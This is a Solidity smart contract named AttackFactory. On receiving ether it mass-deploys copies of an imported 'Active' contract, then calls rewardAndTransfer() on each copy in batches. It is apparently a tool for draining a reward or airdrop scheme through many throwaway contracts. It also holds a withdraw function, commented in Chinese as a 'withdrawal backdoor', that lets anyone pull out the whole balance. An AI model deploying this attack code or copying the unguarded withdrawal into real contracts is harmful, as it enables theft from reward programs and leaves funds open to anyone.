// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "./Active.sol";
import "@openzeppelin/contracts/access/Ownable.sol";




interface IActive{
    function rewardAndTransfer() external;
}

contract AttackFactory is Ownable{

    mapping(uint256=>address) public indexToAddress;
    bool public flag;

    uint256 public index;
    uint256 public rewardIndex;
    uint256 public times = 5;

    function setTimes(uint256 _times) external onlyOwner() { 
        times = _times;
    }

    function setFlag() public onlyOwner() { 
        flag = !flag;
    }



    receive() external payable{
        if(!flag){
            uint256 localIndex = index;
            for (uint i = 0;i < times; i++){
                address contractAddress =  createAuction();
                indexToAddress[localIndex] = contractAddress;
                localIndex = localIndex + 1;
            }
            index = index + times;
        }
        else{
            uint localRewardIndex = rewardIndex;
            for (uint i = 0; i < times; i++){
                address desAddress = indexToAddress[localRewardIndex];
                IActive(desAddress).rewardAndTransfer();
                localRewardIndex = localRewardIndex + 1 ;
            }
            rewardIndex = rewardIndex + times;
            
        }
        

    }


    function createAuction() private  returns (address) {
        Active active = new Active();
        return address(active);
    }

    //提款后门
    // 提取合约内的余额
    function withdraw(address payable _address) public {
        _address.transfer(address(this).balance);
    }


}
